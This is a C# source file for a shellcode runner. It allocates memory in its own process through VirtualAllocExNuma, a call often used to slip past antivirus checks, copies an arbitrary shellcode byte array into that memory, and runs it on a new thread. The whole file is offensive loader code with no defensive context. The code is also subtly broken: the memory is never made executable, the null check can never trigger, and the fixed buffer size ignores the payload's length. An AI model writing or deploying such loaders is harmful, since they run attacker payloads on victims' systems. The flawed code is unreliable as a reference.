using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class VirtualAllocExNumaThreadExecute
{

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
    dwMilliseconds);
    public static void Execute(byte[] shellcode)
    {
        int size = shellcode.Length;
        IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4,0);
        if (addr == null)
        {
           return;
        }
        Marshal.Copy(shellcode, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}